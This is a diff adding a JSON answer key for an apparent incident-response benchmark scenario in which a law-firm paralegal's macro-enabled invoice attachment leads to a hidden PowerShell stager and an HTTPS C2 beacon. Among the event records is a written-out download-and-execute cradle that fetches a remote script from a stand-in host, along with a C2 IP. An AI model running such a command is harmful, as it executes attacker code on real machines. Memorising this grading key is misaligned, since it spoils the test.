@@ -1,0 +1,742 @@
+{
+  "schema_version": 2,
+  "scenario_name": "phishing-c2-beacon",
+  "scenario_description": "A paralegal at a small law firm opens a macro-enabled attachment from a\nphishing email disguised as an overdue invoice notice. The macro\nlaunches a hidden PowerShell stager that establishes a periodic HTTPS\nbeacon to external infrastructure. After roughly ninety minutes of\nroutine check-in traffic, one connection within that same channel\ncarries a byte volume an order of magnitude larger than every other\nbeacon tick — a manual attacker action riding the C2 channel, not the\nbeacon itself. Tests whether an agent traces delivery -> execution ->\nC2 as three distinct, separately-citable stages, and specifically\nwhether it notices the one connection that isn't like the others\nrather than treating \"found a beacon\" as the end of the investigation.\n",
+  "generated_at": "2024-11-04T13:00:00Z",
+  "observation_profile": "complete",
+  "collection_window": {
+    "start": "2024-11-04T13:00:00Z",
+    "end": "2024-11-05T13:00:00Z"
+  },
+  "source_evidence_status": {
+    "evt-beacon-004": {
+      "sysmon": {
+        "visible": 79
+      },
+      "windows_security": {
+        "visible": 121
+      },
+      "zeek": {
+        "visible": 158
+      }
+    },
+    "evt-execute-002": {
+      "sysmon": {
+        "visible": 14
+      },
+      "windows_security": {
+        "visible": 2
+      }
+    },
+    "evt-execute-003": {
+      "sysmon": {
+        "visible": 10
+      },
+      "windows_security": {
+        "visible": 5
+      },
+      "zeek": {
+        "visible": 4
+      }
+    },
+    "evt-manualcmd-005": {
+      "sysmon": {
+        "visible": 1
+      },
+      "zeek": {
+        "visible": 2
+      }
+    },
+    "evt-phish-001": {
+      "sysmon": {
+        "visible": 5
+      },
+      "windows_security": {
+        "visible": 6
+      },
+      "zeek": {
+        "visible": 6
+      }
+    }
+  },
+  "storyline_steps": [
+    {
+      "storyline_id": "evt-logon-000",
+      "index": 0,
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "James logs into his own workstation for the day, as usual",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "logon"
+      ]
+    },
+    {
+      "storyline_id": "evt-phish-001",
+      "index": 1,
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "A phishing email disguised as an overdue-invoice notice is delivered to James's inbox",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-execute-002",
+      "index": 2,
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "James opens the attachment, enabling macros when prompted",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-execute-003",
+      "index": 3,
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "The document's macro silently launches a hidden PowerShell stager",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-beacon-004",
+      "index": 4,
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "The stager establishes a periodic HTTPS beacon to external C2 infrastructure, continuing for about three hours",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "beacon"
+      ]
+    },
+    {
+      "storyline_id": "evt-manualcmd-005",
+      "index": 5,
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "Roughly ninety minutes into the beacon, one connection within the same channel carries far more data than any routine check-in — a manual attacker action riding the C2 channel",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection"
+      ]
+    }
+  ],
+  "red_herring_steps": [],
+  "intent_reconciliation": {
+    "complete": true,
+    "expected_count": 6,
+    "planned_count": 6,
+    "occurred_count": 5,
+    "observed_count": 5,
+    "missing_intent_ids": [],
+    "unexpected_intent_ids": [],
+    "intents": [
+      {
+        "intent_id": "1787f8dd-e839-4828-86e7-1f84eb87f90a",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-logon-000",
+        "event_type": "logon",
+        "semantic_instance_key": "6b4560dee35b917a46a5395a:0",
+        "authored_time": "+2h00m",
+        "actor": "james.okafor",
+        "system": "WS-JOKAFOR-01",
+        "activity": "James logs into his own workstation for the day, as usual",
+        "planned": true,
+        "action_ids": [],
+        "occurrence_ids": [],
+        "source_status": {}
+      },
+      {
+        "intent_id": "aac26e69-c442-4425-92cf-d8b0f25b16fe",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-phish-001",
+        "event_type": "email_message",
+        "semantic_instance_key": "f986bfbdd2394374f09dd094:0",
+        "authored_time": "+2h05m",
+        "actor": "james.okafor",
+        "system": "WS-JOKAFOR-01",
+        "activity": "A phishing email disguised as an overdue-invoice notice is delivered to James's inbox",
+        "planned": true,
+        "action_ids": [
+          "046b9bd8-d36b-484c-b2ea-f5034bb0bee9",
+          "5a6a8667-f0fc-40f8-bc33-3ac8f51eeca0",
+          "7834b2ab-8377-40e0-90ec-7903f8482ec9",
+          "c3e0de52-bc10-4cd9-8494-cef8842d7abb",
+          "dcb751ea-e5db-49a2-96b9-ea121cc3c4ea"
+        ],
+        "occurrence_ids": [
+          "2ab72cf8-2e3c-4ae9-b7d4-21b0f0b78e10",
+          "5563a340-5876-442e-92d6-bd594716df9a",
+          "7a02c9c6-b83c-46b4-8dda-fb88fb248216",
+          "8b3aafed-eddf-4d5e-850f-e6afdd37d6c7",
+          "8e05b154-9556-4dd6-a8df-8e354b8d2b40",
+          "99291e66-665c-4be0-8fdb-f3ad8843fd0d",
+          "a8d65085-64a9-47fd-b612-69e174af94a1",
+          "b5f763c7-2798-4bb0-b290-95456c2aabad",
+          "b66cb0e3-6c78-49eb-a2eb-9c79d7393245",
+          "beff28c0-628f-4221-ac53-de054aa624bf",
+          "ed93bde3-5ace-4685-bf13-08d66b3b6850"
+        ],
+        "source_status": {
+          "sysmon": {
+            "visible": 5
+          },
+          "windows_security": {
+            "visible": 6
+          },
+          "zeek": {
+            "visible": 6
+          }
+        }
+      },
+      {
+        "intent_id": "97539315-3e62-42b1-8cfd-ce50b332ba59",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-execute-002",
+        "event_type": "process",
+        "semantic_instance_key": "bff81a13bc174401a86a38ce:0",
+        "authored_time": "+2h12m",
+        "actor": "james.okafor",
+        "system": "WS-JOKAFOR-01",
+        "activity": "James opens the attachment, enabling macros when prompted",
+        "planned": true,
+        "action_ids": [
+          "ee069acf-b747-4a58-884a-1f324463ab53"
+        ],
+        "occurrence_ids": [
+          "0287b0b8-4761-4d44-80be-6ac0b8c8544e",
+          "25060eaf-854b-486b-8f0d-f625b7ee6e38",
+          "2e0c6f18-e87d-49dc-96d8-631602ba061c",
+          "33b3b202-fbf4-4b58-9219-87f658005c0f",
+          "6075b806-7cad-41fe-8225-5edcfe1539dd",
+          "7c763411-20af-44b4-b3f8-b4eb50f98835",
+          "a099fcdc-95c8-498e-82ed-77be02750c8f",
+          "a9cab548-98a6-469b-9647-274cb88dfd2f",
+          "b19cd62a-ef78-459c-a3e7-75443475dd3e",
+          "c68192ff-2e1d-4ad1-8a53-ea684b0827d2",
+          "ca486ad6-93a0-47dc-a613-70219ed358c1",
+          "d7ffc3db-91b5-4f0d-886c-0b547a58eb28",
+          "df99118e-b5c6-4e2e-b21f-9c9f6af3dee5"
+        ],
+        "source_status": {
+          "sysmon": {
+            "visible": 13
+          },
+          "windows_security": {
+            "visible": 1
+          }
+        }
+      },
+      {
+        "intent_id": "5ca86d52-a930-40d3-87c5-b57cefbf05dc",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-execute-003",
+        "event_type": "process",
+        "semantic_instance_key": "546cf6246b30750307afc5a8:0",
+        "authored_time": "+2h13m",
+        "actor": "james.okafor",
+        "system": "WS-JOKAFOR-01",
+        "activity": "The document's macro silently launches a hidden PowerShell stager",
+        "planned": true,
+        "action_ids": [
+          "49c03cf5-4001-41ad-8108-1678659f5627",
+          "5889402e-920d-48ff-b855-70a21b72ebe0",
+          "8b4c517b-7183-4b9d-bb55-93595bb4d6a6"
+        ],
+        "occurrence_ids": [
+          "189703ab-7454-4e8e-b86f-261f4bde06cc",
+          "21ee3048-1a9d-45b3-8958-37d9147e699d",
+          "719e55e9-d0c6-47ca-9f83-f720bbe7af81",
+          "8365c265-b00c-4d7c-87c0-92b3f2653129",
+          "a80a84ca-2992-47a9-a75d-7217b851818a",
+          "b777ce04-d754-4048-a44a-21af0ce565e5",
+          "bfc14b76-1318-4b9f-bfc0-6ca96684af1f",
+          "c14f951f-8f7c-4f71-98a3-f97b241b81d1",
+          "c9c64653-66e9-4a0f-81b6-d9617f314980",
+          "d8250e81-00f3-48d7-9686-f850c1add798",
+          "da11b379-0fe4-4ef1-a1c8-7b705b2906bb",
+          "f0891dbd-8b8c-4802-bee0-fdae96080c1c",
+          "f1672377-b210-4246-9716-e67720c4f861"
+        ],
+        "source_status": {
+          "sysmon": {
+            "visible": 10
+          },
+          "windows_security": {
+            "visible": 5
+          },
+          "zeek": {
+            "visible": 4
+          }
+        }
+      },
+      {
+        "intent_id": "df13465b-b4e5-458e-861e-f4cb9dff8598",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-beacon-004",
+        "event_type": "beacon",
+        "semantic_instance_key": "daf2be0ce6381f9c4154204e:0",
+        "authored_time": "+2h14m",
+        "actor": "james.okafor",
+        "system": "WS-JOKAFOR-01",
+        "activity": "The stager establishes a periodic HTTPS beacon to external C2 infrastructure, continuing for about three hours",
+        "planned": true,
+        "action_ids": [
+          "047e942a-48c6-48fe-9a12-064ba9cb53cb",
+          "04b34a9d-a4eb-4975-9e30-e649ee373025",
+          "0587521a-128a-4c8f-a709-b59bb5bf0f45",
+          "05d719d1-4f51-4048-a132-9f440f2434ee",
+          "08b5f03f-4c22-403f-8e58-a4d59b62a1c9",
+          "08dd3de0-9920-4f59-9fa7-9922c871d8b9",
+          "0d2b3ed4-d508-4c81-822c-76808f5d0216",
+          "0f6e66d5-4f0b-461a-8d31-429f3f70e665",
+          "14a0ce91-347d-4a02-a665-d6c158a3da5b",
+          "1b9c1b45-6c3c-4825-8f21-f085b92d4271",
+          "1cb48820-6a5a-4522-922d-45bee318cbea",
+          "2582a72e-8237-4b5d-9b0c-61dfca08f2b8",
+          "28b19894-f440-49cf-b071-a866beac3e61",
+          "28b48d43-c96d-4beb-99c8-6432d8359262",
+          "2c099a15-9eee-4349-9405-a6e51ca289ba",
+          "2c9c77c3-1c75-4d7f-ab62-f31dc91f6846",
+          "3355ecad-e42a-42da-ad44-6c68daf4ac17",
+          "36b946af-cfb0-4b65-9f50-856c0b6f0450",
+          "3a6ac7af-107b-41a0-b860-a740e8810707",
+          "3d0e64bb-3ba1-47ba-b9bd-a8d5d6d160a0",
+          "3f2d3a71-e1ad-430f-bc74-10c646e64b66",
+          "4040c45f-223d-4b62-b111-359fc1a50662",
+          "472c91b9-8276-4c9f-aae0-96d02c26bcda",
+          "4c379949-d647-40cd-a4d4-06c4f5f9e94d",
+          "4ca3714c-29f8-4e28-bc2e-fe3ff1af240c",
+          "4f0848ca-758d-4d19-803f-7b47baa4da70",
+          "51f1c57e-8527-4ad3-a657-4ddfe8469351",
+          "52f65ae5-b19d-43a8-bf39-8d52535357c6",
+          "5781706e-1ece-4afb-9a8b-ec4e223eb441",
+          "57fa7c09-7420-4017-9f9a-6c6229686533",
+          "59b3339c-9c02-4b33-ad2f-f148bea600e2",
+          "5c638ecf-49d6-4794-9efb-c2efb7d95325",
+          "5f4df224-b95b-4fce-99e3-e242ef0fd538",
+          "6266189f-115a-4f4d-a0e6-4618799e7be1",
+          "642eb464-ca85-4923-bdda-e85c8aabdb00",
+          "644fbdc3-f0c8-4eb5-9f39-bc297e337574",
+          "6b1ea16b-21bf-4a65-b51a-b1432d69f093",
+          "6b1f81ea-ffb4-49f0-bf2c-fbd99bd5c9ff",
+          "71e1ee8c-37c7-4fd4-b150-3911a03c9622",
+          "7521d8ce-8289-4ce5-9db7-a934de8e95ad",
+          "75bbe293-55be-4380-b722-fa1d415daac8",
+          "790e6318-b525-47b1-8371-376b23f2ba32",
+          "7c10dba8-afdb-4de5-8436-5b27715b46e6",
+          "80882466-260c-4841-b5cc-40cbd62f0017",
+          "80c5f88f-2ba3-4c8f-a784-a5393e523cb1",
+          "813c8ef9-3160-4860-8772-ea1afd0d2cd7",
+          "845598d9-8b53-4dfe-ae3c-b12a60a80974",
+          "85f2fbd7-4738-4e04-8507-a21fd9638571",
+          "85f40a4a-03a0-4f40-962a-01f273862849",
+          "88d13fe9-affc-4998-aa85-3a5d481a72df",
+          "89ac871f-3475-416f-9b0d-6ca7d949e0a1",
+          "89fe35dd-4eb3-4c3c-ac51-fadf4f594539",
+          "8abf038e-0f75-406f-a0a8-1a51c13b0c9a",
+          "8c97ed57-a308-4ed4-87c6-fd003eb15951",
+          "906e2f02-23df-46fe-bf68-5547c9006042",
+          "972a5bbc-6c96-4978-801e-0fe8c496cc81",
+          "9bdc44cb-a69a-492b-bc90-a11d747d13fd",
+          "9e798ca5-4470-42b1-bab2-c23179cc61d2",
+          "9efcab9c-ca51-4eaa-9063-5e881d20ff98",
+          "a105cec7-c302-4c68-8df2-64175dccac29",
+          "a28da8ac-75ed-46a1-88bf-c6f164ecd470",
+          "a42343b5-6080-470e-b99d-637af71dd52b",
+          "af4dafea-26e1-4177-8ad0-7759476ad457",
+          "b0aa8d8a-ee5d-4000-b10c-d1a6adb01cd5",
+          "b2798b4a-1711-44e9-b9fa-ec7ec718ee84",
+          "b73d1714-d295-48b7-9843-215808f490c2",
+          "bd929b3c-d1be-4c5f-bfb1-8d5a638648e1",
+          "c177c50c-2eb0-4baa-9105-c7440dc9c316",
+          "c3b58929-49ed-40ff-9bac-357323469dc6",
+          "ca241e01-7039-4c5b-93cb-9c85ae9adcb4",
+          "cd0a9c27-1c19-4a1f-a3ce-7d3a565c9dc3",
+          "d333b74d-53ec-480d-8f7b-7e7e761685d1",
+          "db8e38c6-874a-4c7c-83a2-622607966646",
+          "e1370cd2-fed9-4309-b78a-05f8b2f73de9",
+          "e6c2cca0-6cfa-4ce7-b29a-8cc73ea53d09",
+          "e8bbb21b-8bcc-49ca-a31f-e0d4b3b92fae",
+          "e90e97eb-c2df-43c5-b91b-44e40b4a3d46",
+          "f77fc77d-674e-4d04-a28a-448fae56bce4",
+          "fd1d19c0-b2b2-4e60-83a4-71f57a3b8b18"
+        ],
+        "occurrence_ids": [
+          "0187a099-7968-4466-8fc3-45072205452e",
+          "04c81e96-bc42-4c4c-8891-4e91fa55a6ac",
+          "061a29a0-1d29-4f90-844f-d50ac37dcd43",
+          "06bbcd36-0883-46d4-bca4-28a572d3c9c2",
+          "07faf852-edbf-4784-83e4-4471bfeeb160",
+          "0929d554-bf77-4f28-8c4b-ba7cd4ef9c28",
+          "0ac47e1a-9fe8-4d50-928b-1549f0959b8d",
+          "0e063006-3abd-4ffc-8816-7e0092b20c00",
+          "0f00867b-48dc-401a-bc67-488974f0f7cd",
+          "0f94f27c-a5d7-4fd8-b5af-730142bfc417",
+          "101c270f-e050-471d-96f4-83fb3378c062",
+          "1045cb04-b53f-45f8-908b-68569aca13dd",
+          "10975b72-7c7e-4589-a40f-139028871ec2",
+          "10ab11f7-6ad7-404d-bf8c-b7515d2123ce",
+          "115d3c79-39da-4e31-a779-239061188240",
+          "11fbfac1-62b3-4a26-9d94-a02f6f0a3725",
+          "1274c4dc-7efa-4719-81c1-17fe0378e6ff",
+          "1319582b-1780-40ff-ae99-a4e71fb226c3",
+          "13e4f733-3e9c-4fd4-9c5f-d4cd1ad94e6b",
+          "1b4ba246-5181-4073-9eec-82c97c3c36be",
+          "1b6a9227-d145-4dcc-9f51-e3a5b4936ea4",
+          "1c188074-5a71-480a-84e5-c9bc6ab437ce",
+          "1c4a32d2-ffd7-47f5-a229-2e76230dadb9",
+          "1c78b8ab-dffc-47b4-94af-58e74d3d1707",
+          "1e046e1b-5538-40ea-8889-507d123be246",
+          "1eec4989-a4a2-492e-9bd6-a2518b0e3a3f",
+          "2136d2ac-e090-4c75-879a-18a5bf10ae99",
+          "21df250b-95f7-47a3-854c-cfc705017d25",
+          "22d84880-4d3e-4636-aa8f-ecb5f9424c43",
+          "23e744b9-9937-4c70-a08a-4a92bc2afb39",
+          "24d4f181-4d12-4f1a-a0e7-6a06e4e2014a",
+          "251d822f-2b5e-4ab5-9392-5aac76e49871",
+          "27148447-ae3c-42ca-bca3-d4040a6b1c31",
+          "281f2d35-c5f9-4b46-9c99-9868b478c4b0",
+          "2940e394-da6f-48e9-adee-7b3a2fb4104c",
+          "2cdb49de-9079-4bce-9810-8ffacbd19b9a",
+          "2d73c3d2-2294-42ef-81ff-fde4c4db15c6",
+          "32455dc1-7f51-4d56-9108-1cb142f12960",
+          "3290ab42-589b-44f0-ba0b-f458d0e88e9c",
+          "33fb4100-9478-4e04-9ac9-35b25d0a39cd",
+          "36eb4c89-4fcf-43de-9643-1e720312d9d7",
+          "37778f92-4b14-43be-8851-3be4120785a5",
+          "39a5aa41-d7f0-4ad0-9137-fc5335000cab",
+          "39b82a53-381f-41a4-8406-a05e3f839b4f",
+          "3a34faad-433f-4f55-b33d-9b7b06343bce",
+          "3a94d510-1e32-41e3-a830-3e0f6ee698da",
+          "3af53b02-7070-426c-a9fd-7b538313fd4c",
+          "3bb0126d-2ec8-4303-9aac-713da95553e6",
+          "3d6d4217-1255-4176-881a-cde9fa9e5b57",
+          "3f912ff0-13ae-47eb-aa13-47768aaecd0a",
+          "40753623-85fb-45dc-b6c8-6ad2b927df8f",
+          "40b56ca5-35d5-443a-ac9a-ccf041cab36f",
+          "41667860-e101-48eb-af14-0b007ce4cef6",
+          "4335e311-7970-464d-a52d-5f303d867a38",
+          "44f8d38c-8b5c-49a6-b100-e3fe0910f7df",
+          "4875c4d8-b03a-4229-bb91-c5492db76ec2",
+          "48cdf445-aca7-45e6-ab38-e3faae396776",
+          "49157db8-112c-4806-815c-3f4276a1e5b9",
+          "4ce6f7c2-00bc-4143-8962-8ddc3711cc17",
+          "52b10bf9-aecf-4afa-b80f-becc1c6e5abf",
+          "56b73888-aaef-42b2-a6ba-ccbf0e681118",
+          "57cfd78f-c9c6-4ffe-bf41-7b21f455b8bc",
+          "58aa8d9b-35b1-4515-89ed-1b6fcc4b237b",
+          "5a58bd86-5ea6-458a-872f-0fb8fb0f36f4",
+          "5b68d558-7e55-4807-98d8-873620a5f809",
+          "5c09dc61-e0ed-49b7-87ed-419b24f30c48",
+          "5cf19fb0-5822-4fb3-96ca-e148e306007f",
+          "5e099327-0e11-46b7-868b-c0e33d54c54d",
+          "5e9d0917-0794-4638-b2d1-8fbc3e1f160a",
+          "5ed81bfa-1ae6-48e4-b902-868354633da9",
+          "5fda9663-2061-4299-848b-b5504270ea24",
+          "63eba9a5-3f45-4c77-b3fb-c10e22b0ac65",
+          "642d0539-c59a-4b69-9b6d-63ae09dcbd3d",
+          "64656e15-70e6-41f0-9975-d702ff8bc4b9",
+          "64974f57-2304-4029-8ec0-d4684d249258",
+          "64cbaef4-f81e-4a13-ace7-cd5541754339",
+          "654d1032-c0a9-47ca-b026-c7b810134f8b",
+          "65eaef2a-5e9a-42fe-83d3-7e7aae1a49b0",
+          "66126610-3660-44eb-90d2-f6af6af7bb63",
+          "667987bb-2426-4784-afdf-a0bb4d97dc2d",
+          "667ab977-ce19-4307-9833-4bd868f6222b",
+          "66aa99d4-0897-4e3f-9d71-b4f93a62ed1d",
+          "68f5fc40-c66a-4d46-b6f3-8eb0792f5113",
+          "6a7efacb-f1ef-496d-9475-f4f91d74f8bb",
+          "6b559bbb-4f12-4f76-b181-a738868cb514",
+          "6c3f4504-59d3-447f-827b-ba683e2a70cb",
+          "6e2ac83d-e0ac-409d-934a-e56eef35509e",
+          "6e347762-98ba-4152-b971-3080b237e679",
+          "6f7373eb-c1e3-4af4-bc1a-13b4596c2f07",
+          "70bf12bc-a1b1-4886-abad-9b6240e30847",
+          "71bc211c-588c-468d-85b9-541f82e010a8",
+          "72b82b04-ee13-4a93-b139-6071473cad1a",
+          "7621f7d0-da2f-4923-a303-2d7404d1ffc6",
+          "763dbf83-709a-4b0c-99ca-a68d1392d562",
+          "767019d1-8d48-40d1-9f94-e33c70138ac4",
+          "76b3e2ff-4ed3-47d2-bed1-2ac68331049f",
+          "789def07-0928-44e3-ac60-31e9b5cbe158",
+          "7990551f-518f-40fc-9d63-ad87410856de",
+          "7a28c51d-b198-4fd7-8df6-e1c7d9725f02",
+          "7a6f86d2-d237-4909-8fb4-4be7f4426d40",
+          "7bd898bd-c19d-4326-9b56-fe1a7bbe3734",
+          "7eeadd3b-5086-4a29-9eac-ec64f233992a",
+          "806318f9-29e7-4204-ac0a-98095fe77883",
+          "80747e01-47b0-4876-ba48-b1c7cde8cd37",
+          "8339b8f7-a880-4f1c-90d1-e2d7a8f69c58",
+          "836815ad-8763-42da-940f-b3cae2041a1e",
+          "84275071-d18b-4e37-a3dd-96718fb9d248",
+          "86374f7f-f494-4e77-9904-1111e8805871",
+          "87b78c1c-f86b-4576-954e-16a4ad1879c6",
+          "886806cf-4ad8-4ebb-be69-1185d676b814",
+          "89f313a5-579d-4770-9e14-adf7b16c0fe9",
+          "8bd1713c-b540-420a-b430-8e603d92b20e",
+          "8d368599-d470-4fa7-a68d-b90be60f6038",
+          "8ddb85d1-c744-433f-88c2-1b9f3013896c",
+          "8ddef97b-98e5-49c7-9119-9ac9139496d4",
+          "916eab65-264b-464f-b213-b6b2e571b4e0",
+          "917965f1-4452-4ffc-949b-28eab8e27be4",
+          "92d7008a-80da-4b15-9b56-9d618e0779ed",
+          "93c7357f-64a2-44af-9723-4594037192f5",
+          "94df52d4-a478-4817-89ae-eb1e0c6b93a8",
+          "96bee45f-5c54-448f-a3c2-94801591ab7b",
+          "98ad2b62-696d-4e44-99df-b4d62f8f5080",
+          "9a3c9ead-52d6-4fc0-bfc1-185dfdddaf92",
+          "9a559a60-6c39-44a1-956b-4a25be8d0956",
+          "9aaee6ba-fd7e-42fe-90e3-3ac2f2299af5",
+          "9bf0180d-fac3-4ee9-ac4b-de0e121ed381",
+          "9e7bb1d9-8fae-4af7-b572-b3aa48db7168",
+          "a238dcb5-b5b1-4c9b-acf7-2882eef38e85",
+          "a44be125-559c-4ef7-ab50-829aa805cbd7",
+          "a583e6dc-0bb7-407e-94f6-2b50266e51e3",
+          "a5cfa38a-4620-4953-99e2-076b591e51ad",
+          "a6dbffb0-9293-45b0-84b9-f3dbe04c0599",
+          "a7ebf42a-a1ce-4c44-a65c-43bab28e387c",
+          "a7f95a20-a35f-443e-8b43-9713b113becb",
+          "aa218021-4aee-414e-ba3a-a857f0054e5e",
+          "aa401f96-6f99-4e64-b24e-0c069c088021",
+          "aa857af3-82cc-40ec-b090-a3412e8c55ea",
+          "ab6c0b46-8a79-4960-9c17-75dcc2468c3f",
+          "ae03fe69-8397-4bf5-806e-dc6b3009651b",
+          "ae28e03f-59e9-4765-8f77-08d3b0be5036",
+          "aea422c5-685b-4004-9527-940e3bff6346",
+          "af6522f5-4c06-4da5-ae25-0dbc5b11bfb4",
+          "b051fb53-e030-4c65-b582-d3e50d24e717",
+          "b0770ba3-332a-4059-b3cc-e2d6488e4352",
+          "b2ba7985-8d33-4b26-a72d-6e003026f708",
+          "b3655f1f-910a-40e6-aaec-3fca0307756f",
+          "b9ab5b89-c8a8-4fbe-baee-b81f77dfc2e1",
+          "b9e82ee8-8f78-46fe-b464-e8a91f9922fb",
+          "baa85d6f-e570-4277-8ec1-71a1271bf192",
+          "bab37ec7-a87c-47a6-a326-a479f01d08b9",
+          "bafbf1ef-efa3-48e0-bb18-3e7ec997bc4e",
+          "bcd0ab81-fbdc-40ff-80b4-b07941014e50",
+          "bf549893-87a0-4b96-a069-d2e00b9d5150",
+          "c14ded59-cba7-4e60-99bd-eb846b71659e",
+          "c19150f1-3660-41fa-8261-d4330b88af43",
+          "c2039a3c-884c-4d17-8d09-8d9ef9777b24",
+          "c3a9e66f-6fea-4927-8ed2-0fae3de03c46",
+          "c47020b7-05d8-46c1-baa2-a1c0b962db4e",
+          "c4b4b9c4-8eb3-4b3c-8343-d7ee00b0ed59",
+          "c4e5b327-1fa7-4805-85d0-eea488506cb0",
+          "c6259d33-5d97-47a4-be93-dce6ad047020",
+          "c7fc6c20-c435-4f0a-a108-ccd94fc8739d",
+          "c8ab97a4-ccc2-43d8-bd40-8205bc94e3f0",
+          "cbc9683b-a318-4f8b-8670-689e56cde493",
+          "cc60bc22-89d9-4a0f-a8c9-69edf92ece53",
+          "cf951bdd-6bb9-41ce-b5bb-1052f0e77cb6",
+          "d1e48358-0f98-472f-b002-2d88260ee386",
+          "d2b5e7c4-d4f4-4da9-98dc-fd520597e61f",
+          "d3ce3e24-1e31-437c-aecc-0bbb1727031f",
+          "d3edd009-a164-49d7-8dc1-8aab25742ae3",
+          "d57f6db8-e0c4-44c1-874f-a79e65f40e87",
+          "d5d29a1c-c033-4cdf-b215-369d2f8c3847",
+          "da1547d2-42ed-41c7-a683-b890b28a4f0f",
+          "da1f8f34-3d57-4bba-9441-ef2a929260e0",
+          "daab01a6-0d6a-42b9-bdc6-4c81f320e084",
+          "dd10931c-bd68-4d80-bed7-e716dd02fe07",
+          "ddfdf0dd-38de-4e75-834c-dee4cecaef15",
+          "de832818-7e4e-4dc0-9da2-4ee4757f0074",
+          "defb2931-9e6f-4302-9590-37cf01532d9f",
+          "e189beea-9f1e-4ea3-8739-ac43a3e0039a",
+          "e1ce960b-69c9-4d1b-ad5a-ce9df201d121",
+          "e6ef7b64-c3a3-4a8d-b86c-9703a22cf0b9",
+          "e7b573a4-937e-48a4-b1fe-f775bed0c160",
+          "e8260ebe-c5d1-4de0-8a16-8f604fc9846f",
+          "e9600b08-d124-4283-b64e-e5cbb30d4725",
+          "ea3c24aa-75c7-45a2-9863-ccfe4fcc5d9a",
+          "eb1f198e-4dfe-41d1-bb3d-ec06ff76170e",
+          "eb742644-ef87-4c06-ba93-1d1b83a3136f",
+          "eba5f49b-99fe-43ff-9133-f325c723e05f",
+          "ed66e708-c282-437b-95a3-94f2fe9e81cb",
+          "ef1d20c4-9230-4fda-8ad3-34df41b84d5d",
+          "ef26a568-d85b-4113-a895-0b9fc2da0dda",
+          "f03c4d33-af3e-4339-b2fe-6edeacfffffd",
+          "f1cead5b-72cb-44b4-90a0-e47d15e364bc",
+          "f1dd200b-46c6-47b4-b1e9-63e3dcda1b14",
+          "f4775317-3049-4d21-8657-07a70451d9a9",
+          "f560b566-2578-4277-a78a-852d51857fbf",
+          "fa817f3b-bc6e-4ced-82d6-84d81fdf5833",
+          "fe9006d2-0059-4b10-aed9-2d3c774b8e6a",
+          "ffc393b5-b4e8-4ab0-9f25-00b3cbc61468"
+        ],
+        "source_status": {
+          "sysmon": {
+            "visible": 79
+          },
+          "windows_security": {
+            "visible": 121
+          },
+          "zeek": {
+            "visible": 158
+          }
+        }
+      },
+      {
+        "intent_id": "7c5f3c84-5d81-4a06-95f4-ecf82ae4f6fb",
+        "ground_truth_section": "storyline",
+        "storyline_id": "evt-manualcmd-005",
+        "event_type": "connection",
+        "semantic_instance_key": "6bc8d311d1fe69c6a96c042d:0",
+        "authored_time": "+3h44m",
+        "actor": "james.okafor",
+        "system": "WS-JOKAFOR-01",
+        "activity": "Roughly ninety minutes into the beacon, one connection within the same channel carries far more data than any routine check-in — a manual attacker action riding the C2 channel",
+        "planned": true,
+        "action_ids": [
+          "878eb067-0c11-4e4d-ba16-65a469166e42"
+        ],
+        "occurrence_ids": [
+          "28f45515-27b0-4116-a7d5-96839b247a89"
+        ],
+        "source_status": {
+          "sysmon": {
+            "visible": 1
+          },
+          "zeek": {
+            "visible": 2
+          }
+        }
+      }
+    ]
+  },
+  "events": [
+    {
+      "record_id": "evt-beacon-004#0",
+      "kind": "beacon",
+      "intent_id": "df13465b-b4e5-458e-861e-f4cb9dff8598",
+      "storyline_id": "evt-beacon-004",
+      "time": "2024-11-04T15:13:32Z",
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "The stager establishes a periodic HTTPS beacon to external C2 infrastructure, continuing for about three hours",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "action": "allow",
+        "attempt_count": 37,
+        "dst_ip": "45.83.221.40",
+        "dst_port": 443,
+        "interval": "5m",
+        "termination": "3h"
+      }
+    },
+    {
+      "record_id": "evt-execute-002#0",
+      "kind": "process",
+      "intent_id": "97539315-3e62-42b1-8cfd-ce50b332ba59",
+      "storyline_id": "evt-execute-002",
+      "time": "2024-11-04T15:11:35Z",
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "James opens the attachment, enabling macros when prompted",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\james.okafor\\Downloads\\Invoice_4471.docm\"",
+        "pid": 4792,
+        "process_name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      }
+    },
+    {
+      "record_id": "evt-execute-003#0",
+      "kind": "process",
+      "intent_id": "5ca86d52-a930-40d3-87c5-b57cefbf05dc",
+      "storyline_id": "evt-execute-003",
+      "time": "2024-11-04T15:13:29Z",
+      "actor": "james.okafor",
+      "system": "WS-JOKAFOR-01",
+      "activity": "The document's macro silently launches a hidden PowerShell stager",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('https://cdn-updates-svc.net/init.ps1')\"",
+        "network_url": "https://cdn-updates-svc.net/init.ps1",
+        "pid": 4812,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
